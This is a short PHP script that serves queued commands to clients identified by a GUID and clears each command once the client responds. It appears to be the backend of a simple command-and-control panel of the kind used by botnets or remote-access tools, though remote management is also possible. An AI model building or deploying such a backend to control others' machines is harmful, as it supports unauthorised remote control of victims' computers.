<?php
include("includes/connect.php");
if ($_GET['request']) {
    $guid = mysqli_real_escape_string($connect, $_GET['guid']);
    $sql = "SELECT command FROM clients WHERE guid = '$guid'";
    $query = mysqli_query($connect, $sql);
    if (mysqli_num_rows($query) != 0) {
        while($rows = mysqli_fetch_array($query)) {
            echo $rows['command'];
        }

    }

}

if (isset($_GET['respond'])) {
    $guid = mysqli_real_escape_string($connect, $_GET['guid']);
    $sql = "UPDATE clients SET command = 'N/A' WHERE guid = '$guid'";
    $query = mysqli_query($connect, $sql); 
}

?>